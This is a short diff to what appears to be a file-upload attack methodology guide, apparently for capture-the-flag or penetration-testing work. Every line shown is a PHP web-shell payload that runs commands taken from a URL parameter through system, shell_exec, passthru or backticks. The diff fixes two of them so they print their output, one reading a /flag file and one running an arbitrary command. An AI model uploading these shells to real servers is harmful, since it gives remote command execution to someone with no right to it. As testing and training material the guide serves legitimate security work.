@@ -54,8 +54,8 @@ Load file-upload methodology when ANY of these signals appear:
 <?php system($_GET['cmd']); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
-<?php file_get_contents('/flag'); ?>
-<?php `$_GET[c]`; ?>
+<?php echo file_get_contents('/flag'); ?>
+<?php echo `{$_GET[c]}`; ?>
 ```
 
 ### Extension Bypass Matrix
